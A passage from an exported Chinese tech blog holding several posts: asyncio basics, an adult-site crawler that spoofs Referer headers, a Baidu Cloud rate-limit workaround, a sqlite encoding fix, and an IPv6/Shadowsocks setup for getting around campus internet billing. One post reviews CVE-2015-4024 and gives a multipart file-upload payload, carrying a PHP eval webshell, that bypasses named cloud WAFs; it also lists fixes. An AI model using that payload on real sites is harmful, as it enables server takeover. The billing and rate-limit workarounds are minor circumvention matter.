为什么要使用异步编程？\nCPU的速度远远快于磁盘、网络等IO。在一个线程中，CPU执行代码的速度极快，然而，一旦遇到IO操作，如读写文件、发送网络数据时，就需要等待IO操作完成，才能继续进行下一步操作。这种情况称为同步IO。\n\n在IO操作的过程中，当前线程被挂起，而其他需要CPU执行的代码就无法被当前线程执行了。\n\n因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。\n\n多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。\n\n由于我们要解决的问题是CPU高速执行能力和IO设备的龟速严重不匹配，多线程和多进程只是解决这一问题的一种方法。\n\n另一种解决IO问题的方法是异步IO。当代码需要执行一个耗时的IO操作时，它只发出IO指令，并不等待IO结果，然后就去执行其他代码了。一段时间后，当IO返回结果时，再通知CPU进行处理。\n\n# 如何利用Python实现异步\n\n我们首先需要了解以下几个概念：\n - Event Loop\n - Coroutine\n\n其中Event Loop在前面已经解释过\nCoroutine是协程，具体解释可以查阅[协程](http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432090171191d05dae6e129940518d1d6cf6eeaaa969000)\n\nPython 3.5 以后推荐使用 async/await 关键词来定义协程，它具有如下特性：\n\n - 通过 await 将可能阻塞的行为挂起，直到有结果之后继续执行，Event loop 也是据此来对多个协程的执行进行调度的；\n - 协程并不像一般的函数一样，通过 coro() 进行调用并不会执行它，而只有将它放入 Event loop 进行调度才能执行。\n\n这里我就从廖大哪里搬运个小例子(有改动)\n```Python\nimport threading\nimport asyncio\n\nasync def hello():\n    print('Hello world! (%s)' % threading.currentThread())\n    await asyncio.sleep(1)\n    print('Hello again! (%s)' % threading.currentThread())\n\nloop = asyncio.get_event_loop()\ntasks = [hello(), hello()]\nloop.run_until_complete(asyncio.wait(tasks))\nloop.close()\n```\n\n执行结果\n\n```Python\nHello world! (\u003c_MainThread(MainThread, started 140735195337472)\u003e)\nHello world! (\u003c_MainThread(MainThread, started 140735195337472)\u003e)\n(暂停约1秒)\nHello again! (\u003c_MainThread(MainThread, started 140735195337472)\u003e)\nHello again! (\u003c_MainThread(MainThread, started 140735195337472)\u003e)\n```\n其中sleep是我们模拟的io用时，我么你可以从这个小例子中看出，执行hello()的时候，io并未堵塞，而是继续向下执行\nhello()会首先打印出Hello world!，然后，由于asyncio.sleep()是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()完成时，线程就可以接着执行下一行语句。\n\n下一篇文章将在此基础上实现一个简洁、普适的爬虫框架\n","cover":"","link":"2016/12/11/python异步爬虫的学习(一).html","preview":"\u003chr /\u003e\n\n\u003cp\u003e本文主要从一下几个方面进行说明:\n - 什么是\u003ca href=\"http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B\"\u003e异步(Asynchronous)编程\u003c/a\u003e\n - 为什么要使用异步编程？\u003c/p\u003e\n\n\u003ch2\u003e- 如何利用Python实现异步\u003c/h2\u003e\n","title":"Python异步爬虫的学习(一)"},{"content":"\n\n\n\n-----\n# 起因\n-----\n\n有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的https://www.javbus5.com/SRS-055这种链接，\n我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了\n\n-----\n# 构思\n-----\n\n - 爬虫调度启动程序crawler.py\n - 页面下载程序downloader.py\n - 页面解析程序pageparser.py\n - 数据库入库与去重管理程序controler.py\n\n\n\n\n\n爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接\n\n在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库\n\n当这一页所有的子链接爬取完成后，继续爬取下一页。\n\n将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。\n\n对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上\n\n-----\n# 问题\n-----\n\n在写爬虫的过程中遇到了一些问题\n\n1. 在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了\n\n2. 本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程\n\n3. 就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止\n\n4. 存在反扒策略\n   详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了\n   ![1](http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg)\n\n   我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址\n\n   ```\n   https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207\u0026lang=zh\u0026img=https://pics.javbus.info/cover/59pc_b.jpg\u0026uc=0\u0026floor=921\n   ```\n\n   那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了\n\n   通过对html源文件的搜索，我们即可直接发现答案\n   ![3](http://7xusrl.com1.z0.glb.clouddn.com/javbus_003.png)\n   ![4](http://7xusrl.com1.z0.glb.clouddn.com/javbus_004.png)\n   通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样\n   \n   我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏\n   ![2](http://7xusrl.com1.z0.glb.clouddn.com/javbus_002.png)\n\n   那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了\n   ![5](http://7xusrl.com1.z0.glb.clouddn.com/javbus_005.png)\n   ![6](http://7xusrl.com1.z0.glb.clouddn.com/javbus_006.jpg)\n   ![7](http://7xusrl.com1.z0.glb.clouddn.com/javbus_007.png)\n\n5. 常见的Python2.x编码问题,全部转换为unicode字节流就可以了\n    这个问题在我博客中已经记录了[http://www.53xiaoshuo.com/Python/77.html](http://www.53xiaoshuo.com/Python/77.html)\n    有兴趣的童鞋可以看看\n\n6. 遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错\n   导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人\n   ![8](http://7xusrl.com1.z0.glb.clouddn.com/javbus_008.png)\n   ![9](http://7xusrl.com1.z0.glb.clouddn.com/javbus_009.jpg)\n   比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库\n\n   在这其中纠结了一个问题\n   ![10](http://7xusrl.com1.z0.glb.clouddn.com/javbus_010.png)\n\n   就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点\n   最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了\n\n\n-----\n# 小Tips\n-----\n\n1. 对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造\n\n2. 对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情\n\n3. 多看别人的博客学习思路\n\n\n-----\n# 注意\n-----\n爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库\n\n-----\n# 测试展与地址\n-----\n![11](http://7xusrl.com1.z0.glb.clouddn.com/javbus_011.jpg)\n![12](http://7xusrl.com1.z0.glb.clouddn.com/javbus_012.jpg)\n\n-----\n## 代码地址:\n-----\n- *coding.net*    [javbus_crawler](https://coding.net/u/Akkuman/p/Javbus_crawler)\n- *github.com*    [javbus_crawler](https://github.com/akkuman/Javbus_crawler)\n\n司机的名声总算是没有辱没，秋名山依旧，嘿嘿\n![13](https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2070695546,2193961465\u0026fm=116\u0026gp=0.jpg)\n\n**转载请注明来源作者**\n - 博客：53xiaoshuo.com | hacktech.cn\n - 作者：Akkuman\n","cover":"","link":"2016/12/06/javbus爬虫-老司机你值得拥有.html","preview":"\u003chr /\u003e\n\n\u003ch1\u003e起因\u003c/h1\u003e\n\n\u003chr /\u003e\n\n\u003cp\u003e有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的\u003ca href=\"https://www.javbus5.com/SRS-055这种链接，\"\u003ehttps://www.javbus5.com/SRS-055这种链接，\u003c/a\u003e\n我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了\u003c/p\u003e\n\n\u003chr /\u003e\n\n\u003ch1\u003e构思\u003c/h1\u003e\n\n\u003chr /\u003e\n\n\u003cul\u003e\n\u003cli\u003e爬虫调度启动程序crawler.py\u003c/li\u003e\n\u003cli\u003e页面下载程序downloader.py\u003c/li\u003e\n\u003cli\u003e页面解析程序pageparser.py\u003c/li\u003e\n\u003cli\u003e数据库入库与去重管理程序controler.py\u003c/li\u003e\n\u003c/ul\u003e\n","title":"javbus爬虫-老司机你值得拥有"},{"content":"\n\n\n\n**百度云限速比较坑，现在基本200k左右**\n**很多人都知道了，但是总有朋友问我，我说明一下**\n# 首先下载IDM(最好支持正版)\n下载链接：\n[百度云shaoit](https://eyun.baidu.com/s/3nvg3jdf)\n# 开始下载：\n一般的话，小文件直接打开浏览器就可以下载\n# 大文件下载：\n首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载\n# 批量下载与外链获取\n使用这个脚本，具体看链接内介绍\n\n\n\n\n\n[https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B](https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B)\n\n## 如何安装用户脚本\n- Firefox 及相关的浏览器：Greasemonkey。\n- Google Chrome、Chromium 及相关的浏览器：Tampermonkey。\n- Opera (版本 15 及更晚)：Tampermonkey 或者 Violentmonkey。\n- Opera 版本 12 及更早原生支持用户脚本。但 Violentmonkey 能提供更友好的界面和更好的兼容性。\n","cover":"","link":"2016/12/06/突破百度云限速与网页限制批量下载.html","preview":"\u003cp\u003e\u003cstrong\u003e百度云限速比较坑，现在基本200k左右\u003c/strong\u003e\n\u003cstrong\u003e很多人都知道了，但是总有朋友问我，我说明一下\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch1\u003e首先下载IDM(最好支持正版)\u003c/h1\u003e\n\n\u003cp\u003e下载链接：\n\u003ca href=\"https://eyun.baidu.com/s/3nvg3jdf\"\u003e百度云shaoit\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1\u003e开始下载：\u003c/h1\u003e\n\n\u003cp\u003e一般的话，小文件直接打开浏览器就可以下载\u003c/p\u003e\n\n\u003ch1\u003e大文件下载：\u003c/h1\u003e\n\n\u003cp\u003e首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载\u003c/p\u003e\n\n\u003ch1\u003e批量下载与外链获取\u003c/h1\u003e\n\n\u003cp\u003e使用这个脚本，具体看链接内介绍\u003c/p\u003e\n","title":"突破百度云限速与网页限制批量下载"},{"content":"\n\n\n\n# 问题出现：\nYou must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.\n# 产生原因：\n问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。\n# 解决方法：\n## 1. 按提示\n```python\nconnection = sqlite3.connect(...)\nconnection.text_factory = str\n```\n但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2\n## 2. 以utf8的编码格式进行解码转为unicode编码做插入\n```python\ncursor.execute('''\n    INSERT INTO JAVBUS_DATA (姓名, 年龄)\n    VALUES (?, ?)\n    ''', ('张三'.decode('utf-8'), '22岁'.decode('utf-8')))\n```\n但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子\n\n\n\n\n\n```python\n#-*-coding:utf-8-*-\nimport sqlite3\n\ndef decode_utf8(aStr):\n    return aStr.decode('utf-8')\n\nconn = sqlite3.connect(\"something.db\")\ncursor = conn.cursor()\n\ncursor.execute('''\n    CREATE TABLE IF NOT EXISTS JAVBUS_DATA(\n        id       INT PRIMARY KEY,\n        姓名     TEXT,\n        年龄     TEXT);''')\nprint \"Table created successfully\"\ncursor.execute('''\n    INSERT INTO JAVBUS_DATA (姓名, 年龄)\n    VALUES (?, ?)\n    ''', map(decode_utf8, ('张三', '22岁')))\n\ncursor.close()\nconn.commit()\nconn.close()\n```\n# 其他注意：\n有时用第二种方法会出现UnicodeDecodeError\n加入#-*-coding:utf-8-*-\n还是不行请sys指定编码：\n```python\nimport sys  \nreload(sys)  \nsys.setdefaultencoding('utf8') \n```\n**这个问题在python3应该不会出现，python2编码问题，仅作记录**\n","cover":"","link":"2016/12/06/programmingerror-you-must-not-use-8-bit-bytestrings.html","preview":"\u003ch1\u003e问题出现：\u003c/h1\u003e\n\n\u003cp\u003eYou must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.\u003c/p\u003e\n\n\u003ch1\u003e产生原因：\u003c/h1\u003e\n\n\u003cp\u003e问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。\u003c/p\u003e\n\n\u003ch1\u003e解决方法：\u003c/h1\u003e\n\n\u003ch2\u003e1. 按提示\u003c/h2\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003econnection = sqlite3.connect(...)\nconnection.text_factory = str\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2\u003c/p\u003e\n\n\u003ch2\u003e2. 以utf8的编码格式进行解码转为unicode编码做插入\u003c/h2\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003ecursor.execute('''\n    INSERT INTO JAVBUS_DATA (姓名, 年龄)\n    VALUES (?, ?)\n    ''', ('张三'.decode('utf-8'), '22岁'.decode('utf-8')))\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子\u003c/p\u003e\n","title":"ProgrammingError: You must not use 8-bit bytestrings..."},{"content":"\n\n\n# 绝对值得一看的技术文章\n[pdf下载链接](http://7xusrl.com1.z0.glb.clouddn.com/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass%20WAF.pdf)\n\n*[via@[破-见](http://weibo.com/ttarticle/p/show?id=2309404007261092631700) ]*\n","cover":"","link":"2016/09/25/waf攻防研究之四个层次bypass-waf.html","preview":"","title":"WAF攻防研究之四个层次Bypass WAF"},{"content":"\n\n\n# 1.     背景介绍\n今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，[https://bugs.php.net/bug.php?id=69364](https://bugs.php.net/bug.php?id=69364)。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。\n\n目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。\n\n接下来，我们以PHP为例，详细解析我们的绕过方法。\n\n# 2.     绕过WAF的原理\n\n根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符':'，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。\n\n\n\n```php\nprev_len= strlen(prev_entry.value);\n\ncur_len= strlen(line);\n\nentry.value= emalloc(prev_len + cur_len + 1); //1次分片内存\n\nmemcpy(entry.value,prev_entry.value, prev_len); //1次拷贝\n\nmemcpy(entry.value+ prev_len, line, cur_len);   //1次拷贝\n\nentry.value[cur_len+ prev_len] = '\\0';\n\nentry.key= estrdup(prev_entry.key);\n\nzend_llist_remove_tail(header);//1次内存释放\n```\n\n而PHP官方修复方案，在进行合并时，避免重复拷贝，从而避免DOS。绕过WAF的关键在于，PHP multipart_buffer_headers函数解析header对应value时，value值存在多行。每行的字符串以空白符开头或不存字符':'，将进行合并。而WAF在解析文件上传的文件名时，没有考虑协议兼容，不进行多行合并，就可以被绕过。\n\n根据原理构造绕过WAF文件上传防御的payload，WAF解析到的文件名为”test3.jpg”，而PHP解析到的文件名是”test3.jpg\\nf/shell.php”，因为”/”是目录分隔符，上传的文件名变为shell.php。以下是绕过paylaod、测试脚本、paylaod进行文件上传的效果图。\n\n## WAF绕过payload:\n\n```\n------WebKitFormBoundaryx7V4AhipWn8ig52y\n\nContent-Disposition: form-data; name=\"file\"; filename=\"test3.jpg\\nsf/shell.php\n\nContent-Type: application/octet-stream\n\n\u003c?php eval($_GET['c'])?\u003e\n\n------WebKitFormBoundaryx7V4AhipWn8ig52y\n\n```\n\n## 文件上传功能测试脚本: \n\n```php\n\u003c?php\n\n         $name = $_FILES['file']['name'];\n\n        echo $name;\n\n        echo \"\\n\";\n\n        move_uploaded_file($_FILES['file']['tmp_name'] , '/usr/local/nginx/html/upload/'.$_FILES['file']['name']);\n\n        echo \"upload success! \".$_FILES['file']['name'];\n\n        echo \"\\n\";\n\n        echo strlen($_FILES['file']['name']);\n\n?\u003e\n\n```\n\nPayload能够正常上传\n\n![1](http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apwul8mrj30r50fptbm.jpg)\n\n# 3.     绕过WAF实战\n\n笔者通过搭建自己的测试站，接入360网站卫士和加速乐，验证绕过WAF文件上传防御的方法。\n\n## 3.1 绕过360网站卫士\n\n### 步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。\n\n![2](http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apy2esg5j311v0ifdjx.jpg)\n\n### 步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。\n\n![3](http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apztziwvj30vm0g9af6.jpg)\n\n## 3.2 绕过知道创宇加速乐\n\n### 步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。\n\n![4](http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq0sw1luj30wb0f9wjf.jpg)\n\n### 步骤二：成功绕过加速乐，上传shell，文件是syt.php。\n\n![5](http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq1mvbrqj30vr0elwh2.jpg)\n\n## 3.3. 绕过百度云加速\n\n百度云加速与CloudFlare，从百度匀加速拦截页面可以看出使用的是CloudFlare. 但是估计有本地化，百度云加速应该是百度和CloudFlare共同产物吧。测试百度没有搭建自己的测试环境，找了个接入了百度云加速的站进行测试。\n\n### 步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。\n\n![6](http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq30m0wjj31050etdko.jpg)\n\n### 步骤二：成功绕过云加速\n\n同上\n\n# 4.     扩展—更多的工作\n\n## 4.1 分析filename其他字符的绕过\n\n同理，我们发现除了双引号外，使用单引号也能绕过WAF的防御，并实现文件上传。\n\n\n```\n------WebKitFormBoundaryx7V4AhipWn8ig52y\n\nContent-Disposition: form-data; name=\"file\"; filename='test3.jpg\\nsf/shell.php\n\nContent-Type: application/octet-stream\n\n\u003c?php eval($_GET['c'])?\u003e\n\n------WebKitFormBoundaryx7V4AhipWn8ig52y\n```\n\n## 4.2 分析其他应用脚本语言\n\n我们也发现jsp解析也有自己的特点，同时可被用于绕过WAF。暂时未测试asp,aspx,python等常用的WEB应用脚本语言。\n\n# 5.     修复方案\n\n## 5.1 修复方案一\n\n解析文件上传请求时，如果发现请求不符合协议规范，则拒绝请求。可能会产生误拦截，需要评估误拦截的影响范围。\n\n## 5.2 修复方案二\n\n兼容php的文件解析方式，解析文件名时，以单引号或双引号开头，并且对应的单引号双引号闭合。\n\n# 6.     总结\n\n本文通过Review PHP远程dos漏洞(CVE-2015-4024)，并利用该特性绕过现有WAF的文件上传防御，成功上传shell。 更重要的价值，提供给我们一个绕过WAF的新思路，一种研究新方向：利用后端应用脚本与WAF行为的差异绕过WAF的防御。总的来说，一款优秀的WAF应该能够处理兼容WEB应用容器、标准协议、web服务器这间的差异。\n","cover":"","link":"2016/09/24/php-dos漏洞的新利用：cve-2015-4024-reviewed.html","preview":"\u003ch1\u003e1.     背景介绍\u003c/h1\u003e\n\n\u003cp\u003e今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，\u003ca href=\"https://bugs.php.net/bug.php?id=69364\"\u003ehttps://bugs.php.net/bug.php?id=69364\u003c/a\u003e。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。\u003c/p\u003e\n\n\u003cp\u003e目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。\u003c/p\u003e\n\n\u003cp\u003e接下来，我们以PHP为例，详细解析我们的绕过方法。\u003c/p\u003e\n\n\u003ch1\u003e2.     绕过WAF的原理\u003c/h1\u003e\n\n\u003cp\u003e根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符\u0026rsquo;:\u0026lsquo;，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。\u003c/p\u003e\n","title":"PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed"},{"content":"\n\n\n\n\u003e 转载自[Dyhube](http://www.jianshu.com/p/4d44172f1a5b)\n\n# 简述\n\n笔者利用笔记本电脑实现ipv6免费上网已经有一段时间了，原理是通过ipv6访问ipv4资源，在学校网络不限流量、不限时长、20兆带宽（我们学校ipv6限速上下对等20兆，没办法！）,电脑开热点全寝室共用，那真是爽翻天 !\n\n![ipv6](http://7xusrl.com1.z0.glb.clouddn.com/ipv6.png)\n\n\n\n但是每天回到寝室总是打开电脑开热点还真是蛋疼的事情。再说电脑也不能总是开着吧。这时我就想能不能找个路由器，一天二十四小时开机，电脑、手机、平板随时都可以连。这个想法大概出现在半年前，由于手里没有路由器，就一直没弄，但是网上是有各种成功的案例的。\n\n前段时间手里终于进了台K1，由于之前已经查了相当多的教程，所以就顺风顺水，很快就成功了。下面我就主要讲一下openwrt客户端的配置问题。\n\n# 意义\n\n在大部分高校，ipv4一般是计流量或计时收费的，（笔者学校就是计时收费的，50元200小时网通十兆带宽）而且，由于校园的特殊性，相应的价格也比市面上宽带服务商要高。万幸的是，这些高校一般具有ipv6网络环境，并且由于国家的大力支持，普及范围广，而且不计算流量，聪明的人早就想能不能通过利用ipv6已达到免流量及无限时长上网？答案是可行的，鉴于目前公网的环境普遍是ipv4，我们可以找一台同时具有ipv4和ipv6地址的服务器，我们在校内通过ipv6访问服务器，然后服务器处理我们的访问请求以`ipv4/ipv6双栈`的方式代替我们访问互联网，再将数据通过ipv6反馈给我们，从而到达免流上网的目的。并且，考虑到大部分高校ipv6没有限制速度，理论上可以达到服务器出口的带宽，当然，具体取决于你们学校的ipv6出口带宽。\n\n# 为什么用Shadowsocks？\n\n配置简单，真的简单！以前看到过信息学院的学长写的一篇blog,原理是`ipv6 to ipv4` 从而ipv6 to ipv4网络,其实原理是一样的，只是他用了`openvpn`这个软件，但是感觉实现起来好难。像这样的开源支持ipv6协议的软件还是有很多的，这里就不再陈述。\n\n回到原题为什么用Shadowsocks，配置简单。vps服务提供商[搬瓦工](https://bandwagonhost.com/)现在为了迎合国人的需求现在已经预配了Shadowsocks,只需要点击以下安装就ok了。\n\n![1](http://7xusrl.com1.z0.glb.clouddn.com/877518-ab3dea8d36104b08.png)\n\n![2](http://7xusrl.com1.z0.glb.clouddn.com/877518-ab3dea8d36104b08.png)\n\n# 适用对象\n\n具有`ipv6地址`、`ipv4流量`（计时）收费贵爱折腾的大学生。不推荐打国服游戏，延迟你懂的，但对延迟没要求的游戏还是可以玩的，美服、亚服、台服随你玩。\n\n# 准备\n## openwrt固件路由器\n路由器的刷机请自行Google,教程一大堆，刷机时笔者也遇到过很多问题，坚持！如果你的也是K1路由器，也要刷机，不妨看这个[教程](http://akkuman.coding.me/2016/09/22/%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98/)。刷机的重点是刷`Shadowsocks插件`，我的K1直接刷的来自恩山网友的固件，固件里已经附带了Shadowsocks。[openwrt](http://pan.baidu.com/s/1dFJO4hF)固件自取。openwrt控制面板上图。\n\n![3](http://7xusrl.com1.z0.glb.clouddn.com/877518-ed11845c67728119.png)\n\n## Shadowsocks+ipv6节点信息\n因为笔者手里有台美国的vps，并且配置了Shadowsocks，所以现在拿来就直接用，老实说搭建的Shadowsocks平常很少用，之前觉得租这个vps很是浪费。但是自从寝室里有了这台全天候开机的路由器，值了！在这里我要强调一下，Shadowsocks的节点我们需要ipv6地址的，不然还是没法走校内的ipv6通道。\n\n# 前方高能预警\n\n## 操作\n\n首先openwrt固件路由器登陆`192.168.1.1`，初始登录默认密码是：`admin`。登进去之后最好先不要对任何东西改动，按照正常路由器的配置对路由器进行拨号上网。然后选择`Shadowsocks插件`，选择`启动`。（为什么这样做呢？笔者尝试了几下，不拨号上网的话，`Shadowsocks`和`DNS`配置好了以后无法上网，最后总结，先拨号上网、再配置`Shadowsocks`和`DNS`信息）\n\n步骤：点击 `openwrt服务`\u003e`Shadowsocks`，出现以下界面。\n\n![4](http://7xusrl.com1.z0.glb.clouddn.com/877518-8304c61781a62c95.png)\n\n## Shadowsocks的配置\n```\n服务器ip：  \n密码：  \n服务器端口：  \n加密方式：  \n```\n对Shadowsocks配置好了以后，点击下面的透明代理，选择`启动`。\n\n![5](http://7xusrl.com1.z0.glb.clouddn.com/877518-b2304b09473a3a76.png)\n\n对Shadowsocks配置好以后，我们的任务还没有结束，最重要的就是配置`DNS信息`。这里如果不配置DNS，IP地址选择ipv4的，Shadowsocks是国外的，那么通过这种方式使用Shadowsocks就是通过路由器来翻fq，在这里我就不多说了。\n\n## DNS的配置\n\nDNS设置有两种方案，一种是利用`ChinaDNS`，还有一种直接在`DHCP/DNS`设置页面（`网络\u003eDHCP/DNS`）进行填写。\n\n由于本次折腾的特殊性，路由器工作在`纯ipv6环境`下，也就是说路由器没有ipv4的网络，但常用的DNS服务器大多是以ipv4地址方式提供的，如果使用ipv4的DNS服务器就会导致无法解析。此处用了`[2001:470:0:c0::2]`，但是很不幸，该DNS被污染了，无法解析如google，youtube一类网址，但是对国内的网站的解析很好。\n\n\n```\n2001:470:0:c0::2\n```\n\n![6](http://7xusrl.com1.z0.glb.clouddn.com/877518-a819f528346ea980.png)\n\n其他的DNS最好选择Google的，相对的来说，网站解析最全面，而且还可以fq,只是一部分了，选择Google的公共DNS有一个缺点，就是像移动端的微信或者qq了，朋友圈的信息或公众号加载不出来，这是很蛋疼的事情。个人还是推荐上面的那条DNS,速度快、国内网站全面，几乎全覆盖。\n\n下面是一些从网上找来的公共DNS，可以试验一下，说不定有什么以外的收获呢。\n\n```\nordns.he.net  2001:470:20::2     74.82.42.42\n\ntserv1.fmt2.he.net  2001:470:0:45::2   72.52.104.74\n\ntserv1.dal1.he.net  2001:470:0:78::2   216.218.224.42\n\ntserv1.ams1.he.net  2001:470:0:7d::2   216.66.84.46\n\ntserv1.mia1.he.net  2001:470:0:8c::2   209.51.161.58\n\ntserv1.tor1.he.net  2001:470:0:c0::2   216.66.38.58\n\nns.ipv6.uni-leipzig.de  2001:638:902:1::10   139.18.25.34\n```\n\n## Google Public DNS\n\n```\ngoogle-public-dns-a.google.com  2001:4860:4860::8888   8.8.8.8\n\ngoogle-public-dns-b.google.com  2001:4860:4860::8844   